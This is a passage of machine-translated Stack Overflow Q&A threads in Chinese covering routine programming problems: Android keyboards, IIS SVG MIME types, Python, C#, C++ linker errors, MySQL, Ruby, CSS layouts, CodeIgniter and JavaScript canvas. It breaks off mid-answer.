我隐藏了软键盘，因为我在应用程序上有自定义键盘。单击编辑文本时，不应弹出软键盘。所以，我从源头上尝试了很多方法，但除了`editText.setFocusable(false);`. 但是现在的问题是当我单击它时，edittext 没有突出显示，甚至光标也不可见。我曾尝试在清单中使用`InputManager`,并引用了许多[链接 1](https://stackoverflow.com/questions/8997225/how-to-hide-android-soft-keyboard-on-edittext "可选标题")、[链接 2](https://stackoverflow.com/questions/1109022/close-hide-the-android-soft-keyboard?rq=1 "可选标题")等，但这些技术至少不会隐藏我的应用程序上的软键盘。最后我通过setFocusable得到了这个，但是有一个突出问题和光标不可见问题，甚至在onClickListener中也不起作用。有人可以为这个问题提供确切的解决方案吗？代码片段表示赞赏。 `android:windowSoftInputMode="stateAlwaysHidden``requestFocus()`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-18T13:26:19.673

请在清单中使用它：

```
android:configChanges="orientation|keyboardHidden"         
android:windowSoftInputMode="stateHidden" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-26T06:44:15.903

您不需要在 menifist 中添加任何方法。只需添加此代码..当您单击按钮以获取价值时，它将自动隐藏。

想要隐藏软键盘在您的点击监听器方法中使用此代码。

InputMethodManager imm = (InputMethodManager)getSystemService(Context.INPUT_METHOD_SERVICE); imm.hideSoftInputFomWindow(edittext.getWindowToken(),0);

我希望这段代码能正常工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-11T05:27:23.767

尝试这个：

```
InputMethodManager imm = (InputMethodManager)getSystemService( Context.INPUT_METHOD_SERVICE);
imm.hideSoftInputFomWindow( edittext.getWindowToken(), 0); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-12T10:32:45.453

在活动课上试试这个

```
getwindow().setsoftInputMode(winowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN); 
```

这个是避免软键盘

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-11-22T15:55:37.917

如果你 editText.setOnTouchListener 并且当你创建新的 OnTouchListener 时不做类似的事情怎么样：

```
editText.setOnTouchListener(new OnTouchListener(){

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        return true;
    }

}); 
```

# asp.net - svg 无法在 localhost 上的 IIS 网络服务器上运行

> ID：12328651
> 
> 赞同：38
> 
> 时间：2012-09-08T06:39:41.893
> 
> 标签：asp.net, css, iis, svg

我正在尝试使用 css 将“.svg”图像设置为背景图像，但它不起作用。该 url 有效并返回 200 状态代码并适用于“.png”图像。

问题是什么？

* * *

## 回答 #1

> 赞同：72
> 
> 时间：2012-09-08T06:44:33.033

您的 IIS 很可能未将 SVG 配置为内容类型，请尝试添加

```
<staticContent>
    <mimeMap fileExtension=".svg" mimeType="image/svg+xml" />
</staticContent> 
```

在`<system.webServer>`您的 web.config 范围内。

当然，这只有在您的应用程序是提供`svg`. 如果`svg`不包含在您的应用程序中，而是在 Web 服务器的单独目录中，您需要将相同的映射添加到您的 Web 服务器，而不是在“mime-types”选项卡中。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2014-08-02T10:28:09.770

试试这个 - 你的应用程序/网站在 IIS 管理器的默认设置下

![IIS 管理器下的默认站点](../Images/66e3023bda3f6e908e234c45d6a6cafe.png)

然后“添加”->`{ .svg : image/svg+xml }`

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2015-09-30T06:22:25.720

来自 web.config

```
<system.webServer>
    <staticContent>
        <remove fileExtension=".svg" />
        <mimeMap fileExtension=".svg" mimeType="image/svg+xml" />
    </staticContent>
</system.webServer> 
```

或在 IIS 中转到 MIME 类型并添加文件扩展名：.svg MIME 类型：image/svg+xml

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-04-03T17:48:01.580

就我而言，我在范围下的 applicationHost.config 文件（通常位于 C:\Windows\System32\inetsrv\config）中包含了我想要的所有 mime 类型`<system.webServer>`，就像[Joachim Isaksson](https://stackoverflow.com/users/477878/joachim-isaksson)提到的那样。这允许我所有的 IIS 站点继承相同的 mime 类型，并在出现问题时为您提供一个位置来更改它们。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-01-20T11:13:06.500

以防万一，如果有人想使用 IIS 管理器，请在“连接”树上选择“顶部节点”（通常是您所在机器的名称），然后在右侧找到“MIME 类型” IIS 的部分 - 双击相同的部分。您应该会看到“条目类型”为“本地”的所有文件类型的列表。添加上面帖子中提到的“.svg”类型（修改了“Markaius”提到的相同文件）。这使得可以为机器上的任何应用程序“继承”相同的 MIME 类型。

# python - Python - 如何将字符串'p'从列表转换为变量值p

> ID：12328659
> 
> 赞同：0
> 
> 时间：2012-09-08T06:41:52.307
> 
> 标签：python, python-2.7

我有一个来自inspect.getargspec(function).args 的变量名列表。每个列表项都是变量名称的字符串。我需要在函数内部使用这些字符串名称，以便检查参数变量的值是否为字符串。

这就是我正在使用的

```
@staticmethod
def boyleslaw(p, V, k):
    """pV = k
    p=pressure Pa, V=volume m^3, k=constant
    substitute letter to solve for that value
    return x"""

    #sv = countvar(gasses.boyleslaw)
    sv = 0
    if p == 'p': sv += 1
    if V == 'V': sv += 1
    if k == 'k': sv += 1
    if sv > 1:
        raise ValueError('Too Many Variables')

    if p == 'p' and sv == 1:
        x = k/V
        return x
    elif V == 'V' and sv == 1:
        x = k/p
        return x
    elif k == 'k' and sv == 1:
        x = p*V
        return x

@staticmethod
def charleslaw(V, T, k):
    """V/T = k
    V=volume m^3, T=temperature K, k=constant
    substitute letter for value to solve for
    return x"""
    #sv = countvar(gasses.charleslaw)
    sv = 0
    if V == 'V': sv += 1
    if T == 'T': sv += 1
    if k == 'k': sv += 1
    if sv > 1:
        raise ValueError('Too Many Variables')

    if V == 'V' and sv == 1:
        x = k*T
        return x
    elif T == 'T' and  sv == 1:
        x = V*k
        return x
    elif k == 'k' and sv == 1:
        x = V/T
        return x 
```

我想结束这个过程

```
sv = 0
if V == 'V': sv += 1
if T == 'T': sv += 1
if k == 'k': sv += 1
if sv > 1:
    raise ValueError('Too Many Variables') 
```

进入它自己的计数变量函数来计算参数并检查每个参数值是否是一个字符串。到目前为止，我要做什么……然后墙+头……

```
@staticmethod
def countvar(module):
    """Count number of Variables in args"""
    vc = 0
    alist = inspect.getargspec(module)
    for i in alist.args:
        if isinstance(i, str) == True:
            vc += 1
    return vc 
```

这在任一函数上运行时都会返回 3，无论它们的值如何，因为 alist.args 中的每个项目都是一个字符串。如果每个变量的 VALUE 是一个字符串，我只想增加计数器，如果有多个变量，则提高 ValueError。如何将字符串'p'翻译成变量p...

编辑：澄清

```
boyleslaw(6886019.02, 1, k) #Solve for k 
```

`inspect.getargspec(boyleslaw).args` 返回`['p', 'V', 'k']`

我想要一份清单`[6886019.02, 1, 'k']`

`alist[0]`= 返回`'p'`#字符串名称

我需要`return p`#变量值

如果值 p 是一个字符串（如果在调用时选择了哪个变量来解决），则递增计数器以进行错误处理

`boyleslaw(6886019.02, 1, k)`不会引发错误

`boyleslaw(6886019.02, V, k)`将`raise ValueError('Too Many Variables')`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T07:00:11.497

当你定义一个带有位置参数的函数时；每个参数都成为强制性的：

```
>>> def foo(a, b, c):
...     pass
... 
>>> foo()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: foo() takes exactly 3 arguments (0 given) 
```

因此，无需检查每个参数是否已通过，因为 Python 会为您处理这些。

对于您的第二部分，尚不清楚您想要什么。首先，您正在检查变量的名称是否与传递的值匹配`if V == 'V'`，然后对它应用一个不会按照您的想法执行的公式，因为您不能将两个字符串相乘。

```
>>> V = 'V'
>>> T = 'T'
>>> k = 'k'
>>> x = k*T
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: can't multiply sequence by non-int of type 'str' 
```

因此，我认为您真正想要的是尝试*使用数字*进行计算，如果失败，请引发适当的错误。

为此，您可以尝试以下操作：

```
try:
   V = int(V)
except ValueError:
   return "Sorry, V must be a number not %s" % V 
```

为您期望的每个参数添加此检查。这将确保您只有数字，然后您的数学计算将起作用。

如果知道传入的其中一个值必须是浮点数（即带小数点）；然后用 转换它`float()`，否则你会得到另一个惊喜：

```
>>> int('12.4')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
ValueError: invalid literal for int() with base 10: '12.4'
>>> float('12.4')
12.4 
```

编辑：

因此，在您澄清之后，我认为您想要的是：

```
def boyleslaw(variables,solvefor='k'):
    # Normalize stuff
    variables_passed = {k.lower():v for k,v in variables.iteritems()}
    solve_for = k.lower()

    if not len(variables) or len(variables) == 1:
        return "Sorry, you didn't pass enough variables"

    if solve_for in variables_passed:
        return "Can't solve for %s as it was passed in" % solvefor 
```

该方法将字典作为变量；默认情况下解决`k`. 你可以这样称呼它：

```
d = {'V': 12, 't': 45}
boyleslaw(d) # default, solve for k

d = {'t': 45, 'k': 67}
boyleslaw(d,'V') # solve for V

d = {'t':1}
boyeslaw(d) # results in error "Didn't pass enough variables"

d = {'t': 45, 'k': 67}
boyleslaw(d) # results in error "Can't solve for k because k was passed in" 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T09:33:12.893

这是一个替代解决方案：

```
def boyleslaw(p=None, V=None, k=None):
    """Given two of the values p, V or k this method
    returns the third according to Boyle's Law."""
    assert (p is None) + (V is None) + (k is None) == 1, \
        "exactly 2 of p, V, k must be given"
    if p is None:
        return 1.0 * k / V
    elif V is None:
        return 1.0 * k / p
    elif k is None:
        return 1.0 * p * V 
```

这个函数首先断言你已经为它提供了三个数量中的两个。然后它返回第三个数量。所以你不必明确地告诉这个函数要解决哪个数量，因为这从给定的数量中是显而易见的。

```
print boyleslaw(p=2, V=3)        # 6.0
print boyleslaw(V=2)             # -> AssertionError
print boyleslaw(p=2, V=3, k=4)   # -> AssertionError 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T06:48:06.997

我认为您正在寻找的功能是[exec](http://docs.python.org/reference/simple_stmts.html#exec)语句。你可以做类似的事情`exec("p='a string'")`。您现在应该可以打电话`p`并期待`'a string'`

# c# - 静态对象的行为？

> ID：12328661
> 
> 赞同：2
> 
> 时间：2012-09-08T06:42:03.477
> 
> 标签：c#, static

考虑下面的代码

```
class Repository{
  public static Item i; //Item is a type (class)
  GetItem(){
    // initialize i if null. Read i from an xml file if the last write time of file is greater than last read time else return current i
    return i;
  }
  SaveItem(item){
    //save i;
    //write i to xml file
    i=item;
  }
}

class User{
  public static void Main(){
    Repository r = new Repository();
    r.GetItem().MakeChangesToItem(); //method inside item to make some changes
    r.SaveItem(r.GetItem());
  }
} 
```

这段代码是否有可能偶尔出现。显然它对我有用。有时更改会反映在静态项目中，有时不会。当我将 Main 方法代码更改为

```
Item i=new Repository().GetItem();
i.MakeChangesToItem();
r.SaveItem(i); 
```

它工作正常。有没有人经历过这种情况？谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-08T06:52:38.807

静态意味着它不绑定到任何实例，而是按类型进行。静态的一个常见问题是线程。如果您有多个线程（例如，一个 ASP.NET 或 WCF 应用程序，或者您自己使用线程/任务/并行的任何东西），那么疯狂可能会随之而来，因为他们都认为他们在谈论不同的事情，覆盖同一个字段。

我会说静态非常不适合该领域。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:08:52.140

此外，静态对象与在一组封闭类型实例之间共享的类类型有关。所以静态对象在执行中会有不同的表现。相比之下，如果您的静态对象是不可变的，那么您在使用多线程的地方就不需要关心这个对象。

# iphone - 在 MPMediaPlayback 中播放 imdb 视频不起作用

> ID：12328675
> 
> 赞同：1
> 
> 时间：2012-09-08T06:45:22.800
> 
> 标签：iphone, objective-c, video

我从预告片的 imdb 中获取视频网址，例如：

```
http://video-http.media-imdb.com/MV5BMjM2OTAxNDA2Nl5BMTFeQW1wNF5BbWU3MDYwMDA4OTY@.mp4?Expires=1347051666&Signature=4OPreoHNu1wcEMX2UIkKYvnu1y7r9NG6qoLf5w1egm7D-5UVSZI6KAZkxX5BA9h7Zj88LZEEWowBbgdh2CC8Zdr2syj1IL4Ncew~rqgLvuBRkwbHyIJzag2CBXEblmAHkMR3NRoOxy93iUXMvZrNj2pnxuYjF9Bf9AODrBxmUdc_&Key-Pair-Id=APKAILW5I44IHKUN2DYA 
```

通过添加其余代码：

```
moviePlayerController = [[MPMoviePlayerController alloc] initWithContentURL:fileURL]; 
    [moviePlayerController.view setFrame:CGRectMake(0, 70, 320, 270)]; 
    [self.view addSubview:moviePlayerController.view]; 
```

我只收到此错误（在模拟器中，未在设备上尝试）：

```
Error getting audio input device sample rate 
```

问候米尔扎

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:49:35.190

试试下面的代码

```
NSString *url = [NSString stringWithFormat:@"Url"];

    mp = [[MPMoviePlayerViewController alloc] initWithContentURL:[NSURL URLWithString:url]];

    [[mp moviePlayer] prepareToPlay];
    [[mp moviePlayer] setUseApplicationAudioSession:NO];
    [[mp moviePlayer] setShouldAutoplay:YES];
    [[mp moviePlayer] setControlStyle:2];
    [[mp moviePlayer] setRepeatMode:MPMovieRepeatModeOne];
    [self presentMoviePlayerViewControllerAnimated:mp]; 
```

# python - 安装并添加到 PATH 后，“nosetests”在 Windows 上无法识别

> ID：12328678
> 
> 赞同：7
> 
> 时间：2012-09-08T06:47:17.030
> 
> 标签：python, installation, nose, nosetests

我正在[学习 Python the Hard Way 的练习 46，](http://learnpythonthehardway.org/book/ex46.html)我打算安装鼻子并运行鼻子测试。我已经使用 pip 安装了鼻子，但是当我在“测试”文件夹上方的目录中运行鼻子测试时，我得到了错误：

```
'nosetests' is not recognized as an internal or external command, operable program or batch file. 
```

如果相关，我已经修改了 PATH 变量以包含`Python27/Scripts`and的完整路径`Python/Lib/site-package`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-10T19:29:09.893

如果按照 Warren Weckesser 的说明操作后仍然遇到问题，请尝试卸载并重新安装。

使用点子：`pip uninstall nose`

我发现这在 Windows 8 64 位上对我有用

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-06-24T11:13:19.427

我使用的是 Windows，我也遇到了同样的问题。LPTHW 书是基于 Linux 操作系统的，对于 Windows 用户来说有点困难。当我输入鼻子测试时，我得到了错误。然后我输入了 python -m nose ，正如 Spellstaker 所说，它工作得很好。我注意到在大多数情况下，我们需要在开头添加“python -m”才能使其在 Windows 上运行。[![看这里](../Images/f9c0ed50d42807b156fcc2fd18183127.png)](https://i.stack.imgur.com/1pNI3.jpg)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-09-14T17:59:00.787

您也可以`python -m nose`在 PowerShell 中使用。

这在 Windows 7 32 位中对我有用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-10-22T18:27:52.963

[![在此处输入图像描述](../Images/fe6ac941704126824de7cbae3866f479.png)](https://i.stack.imgur.com/qW8W3.png)

命令：`python -m nose`或`py -m nose`

请记住，如果它是本地安装的，您应该留在当前的虚拟环境中运行鼻子。激活后在 PowerShell 中检查本地环境名称**lpthw 。**

# css - 使用粘性页脚时 CSS 高度 100%

> ID：12328681
> 
> 赞同：2
> 
> 时间：2012-09-08T06:47:38.523
> 
> 标签：css, cross-browser, sticky-footer

我有一个带有页眉和[粘性页脚](http://www.cssstickyfooter.com/)的布局。两者都是 40px 高。现在我需要添加一个滚动条，它将填充可用空间（垂直）。它应该是这样的：

![预览](../Images/83c66fe91cd3c6bc57faad2403efae96.png)

有两个限制：

*   没有 JavaScript
*   没有 CSS3 calc() 函数

这个问题有没有严格的CSS解决方案？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T07:14:51.483

这是我将要解释的一个小演示：[little link](http://jsfiddle.net/glee/xnjzd/)。

首先，分别定位 your`header`和`footer`using`absolute`和`fixed`。`40px`在 的顶部和底部添加填充`body`，并确保其`box-sizing`为`border-box`. 将您`aside`的 '设置`height`为`100%`，并确保它是`border-box`. 基本上;

HTML：

```
<header>
    I'm a header!
</header>
<aside>
    Lots and lots and lots of content!
    Glee is awesome!
</aside>
<footer>
    I'm a footer!
</footer> 
```

CSS：

```
html {
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    height: 100%;
}
body {
    padding-top: 40px;
    padding-bottom: 40px;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    height: 100%;
}
header {
    height: 40px;
    width: 100%;
    position: absolute;
    top: 0px;
}
footer {
    height: 40px;
    width: 100%;
    position: fixed;
    bottom: 0px;
}
aside {
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    height: 100%;
    overflow: auto; /*make sure there are scrollbars when needed*/
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:42:09.243

只有`position: fixed`, 边距（42px 用于测试目的，因为，42 但它实际上应该是 40px）和一个额外的 div 里面`#aside`，这是一个小提琴： http : [//jsfiddle.net/PhilippeVay/xcuVv/2/](http://jsfiddle.net/PhilippeVay/xcuVv/2/)在 Firefox、Chrome、Safari 4、IE8 和 Opera 11 或 12 中，但在 IE7 中失败，如果需要兼容性，则需要回退。

请注意，此设计未考虑：

*   上网本或智能手机上的垂直空间
*   如果页眉和页脚占用超过 40 像素会发生什么情况（每个 WCAG 2.0 将文本缩放到 200%，在某些操作系统和浏览器上字体比平常大，等等）
*   在某些移动浏览器中，内部滚动（到一边）几乎是不可能的
*   人们使用空格键或向下键滚动一页现在将滚动一个半屏幕（80px 太多），这会惹恼他们（错误，我们）。请通过简单地单击 JS 中管理的按钮，让您的条形图隐藏或缩小为单个按钮并返回到条形图...

# ruby - Ruby中的十六进制到十进制转换

> ID：12328682
> 
> 赞同：0
> 
> 时间：2012-09-08T06:47:43.360
> 
> 标签：ruby, unpack, hex

我有 `"\001\022"` 一个值。我想要的十进制值是 274。

我尝试了以下功能。但我得到 ["0112"]

```
a.unpack("H*")  ==>  ["0112"] 
```

当我使用计算器将此“0112”转换为十进制时，它给了我 274。我怎样才能使用 ruby​​ 方法得到这样的结果。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:50:08.460

您问题中的格式字符串：“H*”，用于“十六进制字符串（高半字节优先）”。因此，它将您的字符串解码为 4 位十六进制元素的数组。

你需要不同的格式。

试试这个，它将它解码为“16 位无符号网络（大端）字节顺序”整数：

```
a.unpack("n") # => [274] 
```

有关可以在格式字符串中使用的字符的完整详细信息，请查看[String#unpack 的 Ruby 文档](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-unpack)。

# mysql - 在mysql if语句中使用另一个表中的列

> ID：12328685
> 
> 赞同：1
> 
> 时间：2012-09-08T06:48:08.303
> 
> 标签：mysql, sql, sql-update

我写了一个类似这样的触发器：

```
CREATE TRIGGER `update_after_itemPresent` AFTER INSERT ON `bus_repair`
FOR EACH ROW begin
    IF NEW.unit <> `item_present`.`unit` THEN
        update item_present 
        set unit = unit-new.unit 
        where item_present.item_group_id = new.item_group_id;
    END IF;
end 
```

但是当我在表中插入新行时，`bus_repair`它会给出一个错误：

> 未知表 item_present 在字段列表中

知道如何解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T08:44:47.027

将您的 UPDATE item_preset 语句移动到 IF 上方和 UPDATE 内的 IF 或重新表述为条件。您需要先更新或选择表 item_present。

# c++ - 是什么导致这些链接器错误？(Visual C++ LNK2005)

> ID：12328689
> 
> 赞同：0
> 
> 时间：2012-09-08T06:48:59.370
> 
> 标签：c++, oop, class, linker

我是一名新手程序员，仍在尝试学习 C++ 和 OOP 设计基础知识。我一直在自学的项目是一个 C++ 游戏，它有多个类、文件、状态等。然而，我一直遇到文件组织的障碍，从简单地在哪里创建对象到编译 -破坏链接器错误。

这是我遇到的一些错误的示例：

```
1>SMGA.obj : error LNK2005: "class Engine smgaEngine" (?smgaEngine@@3VEngine@@A) already defined in Engine.obj
1>SplashScreenState.obj : error LNK2005: "class Engine smgaEngine" (?smgaEngine@@3VEngine@@A) already defined in Engine.obj
1>StateManager.obj : error LNK2005: "class StateManager gameStateManager" (?gameStateManager@@3VStateManager@@A) already defined in Engine.obj
1>MSVCRTD.lib(cinitexe.obj) : warning LNK4098: defaultlib 'msvcrt.lib' conflicts with use of other libs; use /NODEFAULTLIB:library 
```

我在网上环顾四周，发现了很多类似的问题，这些问题涉及错误的包含保护或包含 .cpp 文件而不是 .h 文件。但是我没有在我的代码中这样做，所以我很茫然。

现在，我猜测错误告诉我我正在尝试创建 Engine 类的 smgaEngine 对象（以及 StateManager 类的 gameStateManager 对象），但我不知道为什么......

这两个对象（smgaEngine 和 gameStateManager）的突出之处在于，我在类声明之后立即在其相应的类的 .h 文件中声明了它们。这可能是问题吗？- 它们仍在包含保护中，我不太确定将它们放在我的代码中的其他位置......这种草率的编码会导致链接器错误吗？

这是可疑类之一...

```
#ifndef ENGINE_H
#define ENGINE_H

#include <SDL.h>
#include "Timer.h"

class Engine
{
private:
    static const int screenWidth = 480;
    static const int screenHeight = 270;
    static const int screenBPP = 24;

    bool running;
    SDL_Surface *mainScreen;
    SDL_Event eventHolder;
    Timer fpsTimer;

public:
    Engine();
    ~Engine();

    void init();
    void handleEvents();
    void handleLogic();
    void handleRender();
    void cleanUp();

    SDL_Event *getEvent();

    SDL_Surface *getMainScreen();

    bool isRunning();
    void setRunning(bool tempRunning);
} smgaEngine;

#endif 
```

这是另一个：

```
#ifndef STATEMANAGER_H
#define STATEMANAGER_H

#include "SplashScreenState.h"
#include <vector>

class GameState;

class StateManager
{
private:
    std::vector<GameState*> stateStack;

    SplashScreenState *splashState;

public:
    StateManager();
    ~StateManager();

    void init();

    void changeState( GameState *tempNextState );
    void addState( GameState *tempNextState );
    void removeState();

    //returns the back() element of the stateStack vector..
    GameState* getTopState();

    void handleEvents();
    void handleLogic();
    void handleRender();
} gameStateManager;

#endif 
```

我一直在努力学习 C++ 和 OOP，但我真的很挣扎。似乎每次我尝试用封装的类编写干净的代码时，我最终都会陷入混乱。我试图防止高度的类耦合，但我经常会遇到链接器错误或类之间缺乏通信能力......是在头文件中创建类实例对象导致这些错误或者是别的什么？如果这是我的链接器错误的原因，那么我应该在哪里创建这些对象？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T06:57:31.123

您已经在头文件中定义了两个全局变量，`smgaEngine`并且`gameStateManager`已经将这些头文件包含在两个（或更多）源文件中。所以你会得到多个定义错误。包含守卫不会阻止头文件被两次包含在不同的源文件中（他们怎么能？）他们阻止头文件被两次包含在*同一个*源文件中。

您非常接近正确答案（至少您对问题有很好的理解）。正确的做法是这样

```
// header file Engine.h
class Engine
{
};

extern Engine smgaEngine;

// in one source file (say Engine.cpp)
Engine smgaEngine; 
```

您现在拥有的是头文件中的声明（*使其*`extern`成为声明），而是源文件中的*定义*。您可以拥有任意数量的声明（只要它们是一致的），但您必须只有一个定义。因此，对于全局变量，将声明放在头文件中，并将定义放在源文件之一中。

# android - 启用从安卓手机检索收件箱短信

> ID：12328690
> 
> 赞同：1
> 
> 时间：2012-09-08T06:49:23.220
> 
> 标签：android, sms, inbox

```
ContentResolver cr = this.getContentResolver();
Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null,null, null);
cursor.moveToFirst();

if (cursor.getCount() > 0) {
    for (int j = 0; j < cursor.getCount(); j++) {
        String text = cursor.getString(
        cursor.getColumnIndexOrThrow("body")).toString();
        Log.d("sms", text);
        cursor.moveToNext();
    }
} else
    Log.d("no", "not working");
} 
```

我还在`<uses-permission android:name="android.permission.READ_SMS"/>`androidmanifest.xml 文件中授予了权限，它显示没有工作

# mysql - 如何选择具有相同 id 的行并添加其字段值

> ID：12328693
> 
> 赞同：1
> 
> 时间：2012-09-08T06:49:55.763
> 
> 标签：mysql, sql

我有带有字段的表格医学记录

```
Name  qunty    min    expiry
a       2       3     14/2/2012
b       4       1     15/12/2010
a       5       3     16/5/2012 
```

我必须选择数量小于最小值的药物。两行可以存在同名但不同的过期时间。所以在那种情况下，我必须添加同名行的数量，而不是与最小值匹配。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:53:21.223

试试这个，

```
SELECT  Name, `min`, SUM(qunty) totalQunty
FROM    medicine
GROUP BY NAME, `min`
HAVING SUM(qunty) < `min` 
```

# [*SQLFiddle 演示*](http://sqlfiddle.com/#!2/bd22d/1)

在那种情况下，我还有一个问题要问你，`min`同名的值是否不变？

# java - GWT 框架问题：chrome 浏览器在框架元素中打开经过身份验证的 url 时未打开身份验证弹出窗口

> ID：12328695
> 
> 赞同：1
> 
> 时间：2012-09-08T06:50:09.370
> 
> 标签：java, gwt

我正在使用 GWT Frame 并设置经过身份验证的 URL。chrome 浏览器未打开身份验证弹出窗口 - 显示 401 身份验证错误。

使用下面的代码。

```
Frame frame = new Frame(authenticatedUrl);
frame.setHeight("550px");
frame.setWidth("99%");*/
frameHolder.add(frame); // frameholder is a horizontal panel 
```

但是框架在 ie 中正确打开了身份验证弹出窗口，firefox

# java - 如何将 java 类与已经运行的守护进程连接

> ID：12328700
> 
> 赞同：1
> 
> 时间：2012-09-08T06:51:57.500
> 
> 标签：java

我创建了一个经常从源收集数据并将其保存到 sql 数据库的 java 应用程序。我还在开发另一个应用程序来对保存到数据库的数据进行操作。

我的问题是我会不断地修改操作类，但想一直让采集应用程序不工作，以免错过任何数据，但是操作类需要连接到采集类，我不确定具体是什么最好的方法是。

如果可能的话，我希望两者尽可能地连接起来，就好像一个是由另一个构建的一样。在java中执行此操作的最佳方法是什么？我正在研究 RPC，但不确定它是否会像上述情况一样快。

任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T07:15:05.477

如果您使用像 karaf 这样的 OSGi 容器，您可以更新正在运行的程序中使用的 jar。它有一个网络界面和命令行界面来帮助你做到这一点。

另一种选择是有两个程序，其中一个与另一个对话。这样，您可以使用新版本的代码重新启动一个，而无需停止另一个。

# gtk - GTK 中的 timeout_id 是做什么用的？

> ID：12328701
> 
> 赞同：1
> 
> 时间：2012-09-08T06:51:59.020
> 
> 标签：gtk, pygobject

我正在阅读官方 PyGObject 教程，并在其中一个示例中找到了这条（无法解释的）行：

```
self.timeout_id = None 
```

（它在`__init__`一个 -descendant 类的函数中`Gtk.Window`；整个列表在[这里](http://python-gtk-3-tutorial.readthedocs.org/en/latest/entry.html#example)）。我无法谷歌它；它是干什么用的？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T06:58:16.067

您没有看到它在 on_pulse_toggled 中被设置并进一步使用？

它被分配了 GObject.timeout_add 的返回值，它添加了一个要在稍后的时间间隔调用的函数，可能会重复调用（就像在这种情况下一样）：

```
 self.timeout_id = GObject.timeout_add(100, self.do_pulse, None) 
```

当您希望不再调用此超时时，您必须将其删除，为此，您需要创建的超时 id：

```
 GObject.source_remove(self.timeout_id) 
```

# php - 在 url 中为 codeigniter 中的不同事件传递唯一事件 ID

> ID：12328704
> 
> 赞同：-2
> 
> 时间：2012-09-08T06:52:54.903
> 
> 标签：php, apache, codeigniter-2, cname

我正在使用 PHP Codeigniter 和 MySQL 开发一个事件管理系统，但我不确定如何解决以下问题

**问题 1**

我想为后端制作 URL，例如

```
www.event-backend.com/event/EVENt_ID (for dashboard)
www.event-backend.com/event/EVENt_ID/registration
www.event-backend.com/event/EVENt_ID/travel
and so on 
```

通过更改**EVENT_ID** 我可以打开不同的事件

但是在codeigniter中我该怎么做，第二个参数将是一种控制器方法，我需要它是动态的。路由是什么？

**问题 2**

我希望人们可以通过键入来访问活动网站（每个活动都是独一无二的）

```
 www.somedomain.com  
     which will be pointing at 
  www.event-backend.com/website/EVENt_ID 
```

**问题 2 可以通过一些 CNAME 记录来解决，但我不知道该怎么做**

请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T11:18:57.967

您可以为此目的使用内部重定向。例如像这样：

```
RewriteEngine On
RewriteRule ^event/(.*)$ /event/controller/$1 
```

# python - Python缩进问题：需要一个缩进块

> ID：12328709
> 
> 赞同：1
> 
> 时间：2012-09-08T06:54:05.527
> 
> 标签：python, django

```
def process_health_case(request):
    about = request.POST['about']
    details = request.POST['narrative_text']
    image=request.FILES['image_scan']
    connection = Connection('mongodb://sbose78:PASSWORD@staff.mongohq.com:10068/BOSE')
    if images:
        db=connection['BOSE']
        fs=gridfs.GridFS(db)
        fs.put(image,filename="image_scan2")
    else:
        #nothing
    return render_to_response('home/new_narrative.html',{ }, context_instance=RequestContext(request)) 
```

我越来越

```
expected an indented block (views.py, line 41) 
```

第 41 行是最后一行。

我哪里错了？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T06:56:41.687

您不能将注释用作空语句，[`pass`](http://docs.python.org/release/2.5.2/ref/pass.html)如果您想要一个不执行任何操作的显式 else，则应使用该注释。

```
if images:
    db=connection['BOSE']
    fs=gridfs.GridFS(db)
    fs.put(image,filename="image_scan2")
else:
    pass
return .... 
```

由于没有声明，只是`else`代码中的注释，python 认为`return`应该是 the 的内容`else`并给出意图错误。

# javascript - 使用 javascript 将文本转换为图像

> ID：12328714
> 
> 赞同：29
> 
> 时间：2012-09-08T06:54:24.307
> 
> 标签：javascript, html, text

有什么方法可以将输入文本转换为图像。我真正想做的是在文本框中输入一些文本并将其显示在 div 上。当我单击按钮时，复制到 div 的文本应更改为图像。有人对这个有了解吗？提前致谢！

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2012-09-08T07:02:09.693

您可以使用隐藏的画布元素执行此操作，并使用`toDataURL`. 您的代码将如下所示：

```
var tCtx = document.getElementById('textCanvas').getContext('2d'), //Hidden canvas
